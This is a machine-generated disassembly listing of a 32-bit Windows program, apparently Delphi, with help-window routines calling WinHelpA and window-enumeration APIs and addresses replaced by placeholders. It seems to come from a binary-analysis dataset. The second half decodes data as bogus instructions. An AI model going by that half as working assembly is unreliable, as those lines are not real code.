cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_4055cc
pop ebx
retn
mov eax rw-data
call sub_4055cc
sub_432cbc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_432d14
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432d1b
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_432870
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_432d24
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_432e1a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_4089c4
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_432870
mov eax ebx
call sub_4331b4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432e21
lea eax [ ebp - 0x110 ]
call sub_403f90
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404200
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_43310c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404200
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_404450
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_432e38
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_432e9a
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432ea1
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_432870
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_432eac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_432f2c
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_432870
mov eax ebx
call sub_4331b4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432f33
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_43310c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_404450
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_432f3c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_433027
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_4331b4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43302e
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403fb4
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_407d54
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_43310c
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_407d54
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_403fe4
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_432870
mov eax [ ebp - 0x14 ]
call sub_404450
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_43303c
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_40843c
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_433097
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408418
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_43310c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404440
xor eax eax
push ebp
push sub_433182
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_4330f0
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433189
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407ae4
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_433198
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_4331b4
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_4330f0
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_433194
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_433198
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_433210
sub_433210
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_43328d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_432c70
call GetTickCount
mov ebx eax
push 0x0
call sub_4060e8
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_432870
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433294
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_404450
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43329c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403228
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_403564
call sub_4055e4
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_4332e4
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_433310
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43337e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433385
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_4055cc
mov eax rw-data
call sub_4055cc
mov eax rw-data
call sub_4055cc
mov eax rw-data
call sub_403f90
mov eax rw-data
call sub_4055cc
mov eax [ rw-data ]
call sub_432940
sub_433388
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4333da
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4333e1
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_43329c
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_4055cc
mov edx eax
mov eax [ rw-data ]
call sub_422e7c
sub_4335e0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
inc ebx
add [ eax ] al
add [ eax ] al
sbb [ 0x34880043 ] dh
inc eax
add [ eax ] ch
inc ebx
add [ eax ] bl
inc ebx
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax - 0x13ffbca0 ] bh
pushad
inc ebx
add [ ecx ] al
inc ebx
add [ eax + 0x6000435e ] ch
pushad
inc ebx
add [ esi + ebx * 2 + 0x43 ] ch
add [ eax ] dl
popad
inc ebx
add ah al
pop edi
inc ebx
add [ eax ] dh
popad
inc ebx
add [ eax + 0x603c0043 ] cl
inc ebx
add [ edx ] dl
push esp
inc esp
jb r-xdata
inc ebx
add [ ecx ] al
inc ebx
add [ eax + 0x6000435e ] ch
pushad
inc ebx
add [ esi + ebx * 2 + 0x43 ] ch
add [ eax ] dl
popad
inc ebx
add ah al
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax ] dh
arpl [ ebx ] ax
movsb [ edi ] [ esi ]
pop edi
inc ebx
add [ eax - 0x17ffbca2 ] ch
popad
inc ebx
add [ esi + ebx * 2 + 0x43 ] ch
add al al
inc ebx
outsd
outsb
je r-xdata
pop edi
inc ebx
add [ eax ] dh
popad
inc ebx
add [ eax + 0x603c0043 ] cl
inc ebx
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x4c ] si
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
inc ebx
add [ eax ] al
add [ eax ] al
fdiv [ 0x34880043 ]
inc eax
add [ eax ] ch
inc ebx
add [ eax + 0x61 ] dl
inc ebx
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax - 0x13ffbca0 ] bh
pushad
inc ebx
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + edx * 4 + 0x37 ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + eax * 2 + 0x37 ] si
inc ebx
add [ eax + 0x4335 ] ch
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
pop edi
inc ebx
add ah al
pop edi
inc ebx
add ah cl
pop edi
inc ebx
add [ edx + 0x43 ] al
add [ ecx + 0x43 ] dl
add [ edx + 0x63080043 ] cl
inc ebx
add [ ebx ] bl
inc ebx
add [ ebx ] bh
inc ebx
add [ edi ] cl
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
inc esp
aaa
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x70004337 ] al
add [ eax ] al
add [ eax ] bl
xor eax 0x34880043
inc eax
add [ eax ] ch
inc ebx
add [ eax ] bl
inc ebx
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0x47ffbc9f ] bh
pushad
inc ecx
add [ eax + 0x3d ] dl
inc ecx
add [ ebp + edx * 8 - 0x2a7fffbf ] dl
inc ecx
add [ eax + 0x75 ] al
inc ebx
add [ esi ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
movsb [ edi ] [ esi ]
cmp [ ebx ] al
add ah cl
pop edi
inc ebx
add [ edx + 0x43 ] al
add [ ecx + 0x43 ] dl
add [ edx + 0x63080043 ] cl
inc ebx
add [ ebx ] bl
inc ebx
add [ ebx ] bh
inc ebx
add [ ecx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
xor al 0x40
add al dh
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ eax + 0x2c004034 ] cl
pushad
inc ebx
add [ ebx + 0x43 ] al
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0x47ffbc9f ] bh
pushad
inc ebx
add [ eax ] dh
arpl [ ebx ] ax
movsb [ edi ] [ esi ]
pop edi
inc ebx
add [ eax - 0x17ffbca2 ] ch
popad
inc ebx
add [ esi + ebx * 2 + 0x43 ] ch
add al al
pop edi
inc ebx
add ah al
pop edi
inc ebx
add [ ebx + 0x433808c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi + 0x43 ] al
add [ eax ] dh
add [ eax ] al
clc
inc ebx
inc ebx
add [ eax ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ ecx + ebx * 4 + 0x77840041 ] bh
inc ebx
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
jae r-xdata
imul esp [ edi + 0x68 ] 0x626d0874
add [ eax + 0x12004377 ] ah
push esp
inc ebx
outsd
outsb
je r-xdata
add [ eax - 0x63ffbbb0 ] cl
push eax
inc esp
add [ eax + 0x79 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar [ eax ] 0x1
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi + 0x640043 ] bh
add [ eax ] al
or al 0xaf
inc ecx
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
sar [ eax ] 0x1
inc ebx
add [ edi ] al
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x4339d890
add [ ebx ] al
or al 0x54
inc ebx
add ah cl
push eax
inc esp
add ah ch
jns r-xdata
inc ecx
add [ ecx + edi * 2 - 0x65dbffbd ] ah
inc ecx
add [ eax + 0x7a ] dl
inc ebx
add [ ecx + ebx * 4 + 0x41 ] dh
add [ eax ] cl
0x9a5c0041 0x41
nop
js r-xdata
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
inc ebx
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
cmp al [ ebx ]
or [ ebp + ebp * 2 + 0x4d ] ah
cmp al [ ebx ]
add ecx [ ecx ]
push esp
inc esp
jb r-xdata
add [ edx + edi + 0x64060043 ] bl
imul eax [ edx + esi * 2 + 0x61 ] 0x67
outsd
insd
popad
je r-xdata
inc ebx
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
inc edx
jae r-xdata
add ah dl
push eax
inc esp
add [ eax ] al
jpo r-xdata
mov esp 0x84004199
ja r-xdata
jae r-xdata
jpe r-xdata
imul ebp [ edi + 0x6e ] 0x3afcc08b
inc ebx
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
lea eax [ eax ]
mov al [ 0x300433a ]
insb
dec esp
popad
popad
outsb
jne r-xdata
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
inc eax
add [ ebx + edi + 0x43 ] al
add [ esi ] al
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
add [ ecx ] al
add [ eax ] al
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
outsb
je r-xdata
or [ ebx + 0x6f ] al
jne r-xdata
inc edx
add [ eax ] eax
add [ eax ] al
add al ah
jpe r-xdata
inc ebx
add ah al
push eax
inc esp
add ah cl
jns r-xdata
add al dh
cdq
xor [ eax ] eax
or al 0x32
inc eax
add [ esi * 2 + 0x3e340043 ] dl
inc ecx
add [ esi + edi ] bh
xor al 0x40
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
cmp [ ebx ] al
js r-xdata
inc ebx
add [ eax + 0x76 ] ah
inc ebx
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
add eax 0x0
inc ebx
add [ eax + r-xdata ] dl
imul ebp [ esi + 0x64 ] 0x1
arpl [ eax + 0x6f ] bp
jb r-xdata
outsb
mov eax eax
cld
cmp al [ ebx ]
add ecx [ ebx ]
push esp
inc ecx
outsb
or [ ebx + 0x6f ] al
outsb
je r-xdata
jbe r-xdata
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
add eax edi
cmp al [ ebx ]
nop
pop eax
cmp eax [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x3a ] dl
inc ebx
add [ ebx ] cl
jae r-xdata
aam 0x3a
inc ebx
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
or [ ebp + 0x62 ] ch
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
add [ edx ] al
add [ eax ] al
add [ eax ] ah
jpo r-xdata
add al dh
xor al 0x40
inc ecx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
dec ebp
popad
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
or [ ecx + 0x6b ] ah
inc edx
outsd
je r-xdata
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add [ ebx ] al
add [ eax ] al
add al bh
cmp al [ ebx ]
push es
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
add al 0x0
add [ esi + edi ] bh
inc ecx
add [ eax + 0x3d ] dl
inc ecx
add [ eax + 0x77 ] dh
cmp al [ ebx ]
push es
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
rcl [ edx + edi + 0x43 ] 0x0
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
push es
add ah dl
cmp [ ebx ] eax
push es
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
add [ edx + edi * 2 ] cl
inc ebx
add al ch
push eax
inc esp
add ah ch
push eax
inc esp
add [ eax ] dh
jpe r-xdata
push eax
inc esp
add [ ecx + edi * 2 ] al
inc ebx
add [ eax ] bh
push eax
inc esp
add [ eax + edx * 2 + 0x44 ] cl
add [ edx + edi * 2 + 0x43 ] bh
add [ eax ] bh
jns r-xdata
inc ecx
add [ eax + 0x10004378 ] dl
outsd
insb
jae r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
in al 0x76
inc ebx
inc ebx
outsd
outsb
jae r-xdata
imul ebp [ esi + 0x74 ] 0x657a6953
inc eax
add [ eax - 0x63ffbfcc ] bl
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ edx + edi ] dl
inc ebx
add [ eax ] cl
insd
dec ebp
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebx
imul ebp [ esi + 0x64 ] 0x1
inc eax
add [ eax + 0x300433a ] ah
inc ebx
outsd
insb
jae r-xdata
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
add [ ebp + 0x39440040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
cmp [ ebx ] eax
sbb al 0x0
add [ eax ] al
sub [ ecx + 0x44 ] cl
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
jne r-xdata
add bh bh
in al 0x76
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
test al 0x3c
inc ebx
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
cmp eax [ ebx ]
adc al 0x0
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
adc [ eax ] al
add bh bh
in al 0x76
inc ebx
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
push esp
add [ eax + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x433b5474
jb r-xdata
popad
js r-xdata
jb r-xdata
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ edi + 0x769c0041 ] ah
inc ebx
pushfd
outsd
insb
add [ eax ] cl
add [ eax ] al
jmp esp
add [ ebx + edi + 0x43 ] dl
jb r-xdata
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x433d20c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
je r-xdata
inc edx
jne r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
cmp eax [ ebx ]
or [ ebx + 0x6f ] al
outsb
je r-xdata
imul ebp [ esi + 0x74 ] 0x433bc073
add al cl
adc eax 0x40041
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
in al dx
cmp eax [ ebx ]
pop es
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
jae r-xdata
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
push ebx
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ ecx ] al
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jae r-xdata
insb
jae r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
add ah dh
adc [ eax ] al
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push 0x3c004010
push cs
inc ecx
add [ eax + r-xdata ] dl
or [ esi ] cl
jb r-xdata
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
popad
outsb
add ah dh
adc [ eax ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
hlt
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
push esp
dec ebx
jns r-xdata
inc ebx
add [ eax ] cl
push cs
jb r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jbe r-xdata
hlt
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x3a ] dl
inc ebx
add [ eax ] al
adc [ eax ] al
nop
xchg esp eax
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
outsb
je r-xdata
je r-xdata
jb r-xdata
hlt
add al dh
